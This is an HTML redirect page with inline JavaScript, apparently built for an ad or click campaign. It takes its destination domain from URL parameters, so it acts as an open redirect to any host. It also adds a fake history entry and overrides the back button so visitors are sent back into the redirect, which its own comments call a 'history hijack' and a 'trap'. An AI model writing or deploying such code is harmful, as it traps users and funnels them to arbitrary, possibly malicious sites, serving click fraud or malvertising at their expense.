<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <style>
    body {
      margin: 0;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: Arial, sans-serif;
      background: #f4f4f4;
    }
  </style>
</head>

<body>
  <h2>Wait while redirecting...</h2>

  <script>
    /************** SETTINGS **************/
    const CLICK_CODE = "wen25tvh";     // campaign / click code
    const TRACK_ENDPOINT = "";         // চাইলে এখানে API বসাতে পারো
    const REDIRECT_DELAY = 800;        // ms

    /************** HELPERS **************/
    function track(eventName, data = {}) {
      console.log("[TRACK]", eventName, data);

      // example: fetch tracking (optional)
      // fetch(TRACK_ENDPOINT, {
      //   method: "POST",
      //   body: JSON.stringify({ event: eventName, data }),
      // });
    }

    function getRedirectUrl() {
      const url = new URL(window.location.href);
      const domain = url.searchParams.get("domain");
      const z = url.searchParams.get("z");

      if (!domain || !z) {
        return "https://google.com";
      }

      return `https://${domain}/${CLICK_CODE}/${z}${url.search}`;
    }

    /************** MAIN LOGIC **************/
    const redirectUrl = getRedirectUrl();

    // 1️⃣ Page load tracking
    track("page_load", { from: document.referrer });

    // 2️⃣ History hijack (fake history entry)
    history.pushState({ trapped: true }, "", location.href);

    // 3️⃣ Initial redirect
    setTimeout(() => {
      track("redirect", { type: "page_load" });
      window.location.replace(redirectUrl);
    }, REDIRECT_DELAY);

    // 4️⃣ Back button hijack
    window.addEventListener("popstate", function (e) {
      track("back_button", {});

      // আবার history push করে trap
      history.pushState({ trapped: true }, "", location.href);

      // back দিলেও আবার redirect
      setTimeout(() => {
        track("redirect", { type: "back_button" });
        window.location.replace(redirectUrl);
      }, 300);
    });
  </script>
</body>
</html>
